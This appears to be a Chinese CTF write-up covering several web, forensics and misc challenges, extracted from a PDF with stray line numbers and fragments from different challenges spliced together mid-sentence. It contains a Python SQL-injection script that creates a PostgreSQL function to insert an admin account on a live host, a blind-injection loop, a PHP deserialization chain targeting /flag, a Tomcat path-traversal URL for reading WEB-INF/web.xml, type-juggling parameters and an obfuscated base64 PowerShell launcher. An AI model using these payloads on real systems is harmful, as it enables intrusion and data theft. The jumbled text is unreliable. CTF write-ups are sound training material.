13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
        elif "Something Error!" in res:
            # print("Change to C_L")
            bottom, upper = C_L
            C_L = (bottom, int((bottom + upper)/ 2) )
    # print("###{},{}".format(bottom, upper))
    return int(bottom)
    if length:
        print(bottom)
    else:
        print(chr(bottom))
def test():
    url = "http://eci-2zeajgj31n7c3bzhuiy6.cloudeci1.ichunqiu.com:8888/"
    data = {
        'username[]': 'admin',
        'password': "'; create function ddkkk(bd text) returns integer as 
$$ BEGIN execute bd; return 1; END; $$ language plpgsql; select 
ddkkk('i'||'n'||'s'||'e'||'r'||'t'||' '||'i'||'n'||'t'||'o'||' 
'||'users(username, p'||'a'||'s'||'sword)'||' values(''admin'', 
''adddd'');'); COMMIT; select 'asdfasdf'::integer; -- -"
    }
    resp = requests.post(url, data=data)
    print(data)
    content = resp.text
    print(content)
    return content
def test2():
    url = "http://eci-2zeajgj31n7c3bzhuiy6.cloudeci1.ichunqiu.com:8888/"
    data = {
        'username[]': 'admin',
        'password': "adddd"
    }
    resp = requests.post(url, data=data)
    print(data)
    content = resp.text
    print(content)
    return content
def main():
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
[强⽹先锋]赌徒
    # sql = "select * from information_schema.columns where 
table_name='users' and column_name='username'"
    sql = "select version()"
    # SQL = "length(({}))".format(sql)
    # length = bin_inj(SQL)
    # print("Length: {}".format(length))
    length = 190
    res = "Post"
    for i in range(1,length+1):
        for char in string.printable:
            SQL = "{} like '{}'".format(sql, res+char+"%")
            # print(char)
            resp = inj(SQL)
            if 'Password Error!' in resp:
                res = res+ char
                print(res)
                break
    print(res)
if __name__ == "__main__":
    # main()
    test()
    test2()
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
name=$a;
    }
}
class Info
{
    public $file;
1
2
3
4
5
6
7
8
9
10
11
12
13
Hard_APT_jeesite
    public function __construct($b){
        $this->file['filename']=$b;
    }
}
class Room
{
    public $filename="/flag";
    public $a;
  public function __construct(){
        $this->filename="/flag";
    }
    public function invoke(){
        $this->a=new Room();
    }
}
$a=new Room();
$a->invoke();
$b=new Info($a);
$c=new Start($b);
echo serialize($c);
?>
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
String filepath = req.getRequestURI();
    int index = filepath.indexOf(Global.USERFILES_BASE_URL);
    if(index >= 0) {
      filepath = filepath.substring(index + 
Global.USERFILES_BASE_URL.length());
    }
    try {
      filepath = UriUtils.decode(filepath, "UTF-8");
    } catch (UnsupportedEncodingException e1) {
      logger.error(String.format("解释⽂件路径失败，URL地址为%s", filepath), 
e1);
    }
    File file = new File(Global.getUserfilesBaseDir() + 
Global.USERFILES_BASE_URL + filepath);
1
2
3
4
5
6
7
8
9
10
11
userfiles ⽂件读取接⼝会截取/userfiles/后⾯的字符，当传递..时，会被 tomcat ⽬录穿越导致⽆法请求到
该接⼝。
通过 tomcat 的 path variable 特性，/userfiles;/能成功访问到接⼝，并且不会被截取。
再使⽤/userfiles;/userfiles/../WEB-INF/web.xml
获取到的 filepath 为 ../WEB-INF/web.xml， 并且最终请求到的还是 userfiles 接⼝，实现了跨⽬录⽂件读
取，然后拿到了邮箱账户。
登录邮箱拿到 flag
[强⽹先锋]寻宝
第⼀关：
第⼆关随意使⽤⼀个⽀持⾃动分⽚下载的下载⼯具即可，⽐如迅雷。
解压拿到⼀堆 docx，写个脚本读⼀下内容找到 flag。
ppp[number1]=11111a&ppp[number2]=3.0e6&ppp[number3]=61823470&ppp[number4]=0e
11111&ppp[number5]=abcd
1
import glob
import zipfile
import tqdm
from xml.etree.cElementTree import XML
1
2
3
4
5
6
EasyWeb
http://47.104.137.239/hint
http://47.104.137.239/files/
WORD_NAMESPACE = 
'{http://schemas.openxmlformats.org/wordprocessingml/2006/main}'
PARA = WORD_NAMESPACE + 'p'
TEXT = WORD_NAMESPACE + 't'
def get_docx_text(path):
    document = zipfile.ZipFile(path)
    xml_content = document.read('word/document.xml')
    document.close()
    tree = XML(xml_content)
    paragraphs = []
    for paragraph in tree.getiterator(PARA):
        texts = [node.text
                 for node in paragraph.getiterator(TEXT)
                 if node.text]
        if texts:
            paragraphs.append(''.join(texts))
    return '\n\n'.join(paragraphs)
files = glob.glob('*/*/*.docx')
for fname in tqdm.tqdm(files):
    res = get_docx_text(fname)
    if 'key2{' in res.lower():
        print(fname, res)
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
{"hint":"# hint ^_^\n\tSo~ How to get files in this server? 
\n\tfiles/????????????????????????????????"}
1
http://47.104.137.239:36842/account/login
后台登录发现有注⼊，直接进后台：
扫描发现存在 file 路由⽂件上传，经过测试发现⽂件采⽤⽆字符 webshell，⽂件名为 1.p {if (response.status == 200) {
    post(ch)
  }});
}
// for(var i=0; i<5; i++) {
      var charset = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 
'b', 'c', 'd', 'e', 'f', '-', '}']
      for(var j=0; j<charset.length;j++) {
        test(charset[j]);
      }
    // }
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
HostApplication=powershell -noprofile & ( $veRBOsepReFErEncE.tOstrINg()
[1,3]+'x'-JOin'')( nEW-ObjEcT sySTEm.iO.sTreaMReAdER( ( nEW-ObjEcT  
SystEm.iO.CompreSsiOn.DEfLATEstREam([IO.meMoryStream] 
[CoNVeRT]::fROMbASe64StRinG('NVJdb5tAEHyv1P9wQpYAuZDaTpvEVqRi+5Sgmo/Axa0VRdo
LXBMUmyMGu7Es//fuQvoAN7e7Nzua3RqUcJbgQVLIJ1hzNi/eGLMYe2gOFX+0zHpl9s0Uv4YHbnu
8CzwI8nIW5UX4bNqM2RPGUtU4sPQSH+mmsFbIY87kFit3A6ohVnGIFbLOdLlXCdFhAlOT3rGAEJY
QvfIsgmAjw/mJXTPLssxsg3U59VTvyrT7JjvDS8bwN8NvbPYt81amMeItpi1TI3omaErK0fO5bNr
7LQVkWjYkqlZtkVtRUK8xxAQxxqylGVwM3dFX6jtw6TgbnrPRCMFlm75i3xAPhq2aqUnNKFyWqhN
iu0bC4wV6kXHDsh6yF5k8Xgz7Hbi6+ACXI/vLQyoSv7x5/EgNbXvy+VPvOAtyvWuggvuGvOhZaNF
S/wTlqN9xwqGuwQddst7Rh3AfvQKHLAoCsq4jmMJBgKrpMbm/By8pcDQLzlju3zFn6S12zB6PjXs
Ifcj0XBmu8Qyqma4ETw2rd8w2MI92IGKU0HGqEGYacp7/Z2U+CB7gqJdy67c2dHYsOA0H598N33b
3cr3j2EzoKXgpiv1+XjfbIryhRk+wakhq16TSqYhpKcHbpNTox9GYgyekcY0KcFGyKFf56YTF7dr
g1ji/+BMk/G7H04Y599sCFW3+NG71l0aXZRntjFu94FGhHidQzYvOsSiOaLsFxaY6P6CbFWioRSU
TGdSnyT8=' ) , [IO.coMPressION.cOMPresSiOnmOde]::dEcOMPresS)), 
[TexT.ENcODInG]::AsCIi)).ReaDToeNd();
1
ISO1995
根据 ISO9660 光盘⽂件系统的格式，在 0x9800 找到了⽂件⽬录表，发现是 1024 个名为 FLAGFOLD 的⽂
件，内容根据 LBA 在后⾯ 0x26800 起的位置中，发现每⼀个⽂件只有⼀个字节，⽽且 FLAGFOLD ⽂件看
上去都⼀样
在 0x16000 还能找到⼀个⽂件⽬录表，有 1024 个 flag xxxxx 的⽂件，时间字段的分钟和秒钟完全不合
法，但是可以组成 0x000-0x3FF 的数字，刚好是 1024 个，FLAGFOLD ⽂件也是 1024 个，尝试把这个和每
个⽂件的内容对应上
flag 就在⾥⾯。
from Crypto.Util.number import bytes_to_long
with open('iso1995', 'rb') as f:
    content = f.read()
res = content[0x26800:].replace(b'\x00'*16, b'')
res = res.replace(b'\x00'*15, b'')
# 0x9800
DIROFF = 0x16044
# DIROFF = 0x9844
flag = [0]*1024
off = 0
tt = []
for i in range(1024):
    while content[DIROFF+60*i+off:DIROFF+60*i+off+2] != b'\x3c\x00':
        off += 1
    # print(hex(DIROFF+60*i+off))
    t = bytes_to_long(content[DIROFF+60*i+off:][22:24])
    # tt.append((i, t))
    tt.append(t)
ff = ''
for idx, val in enumerate(tt):
    # print(val, idx)
    ff += res[val]
    # flag[val[0]] = res[idx]
print(''.join(ff))
#print(len(set(''.join(flag))))
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
签到
签到
CipherMan
⼀个磁盘镜像和⼀个内存镜像
磁盘镜像信息
65536 有 FVE-FS，是 BitLocker
使⽤插件（ https://raw.githubusercontent.com/elceef/bitlocker/master/bitlocker.py ） 可以从内存镜像⾥⾯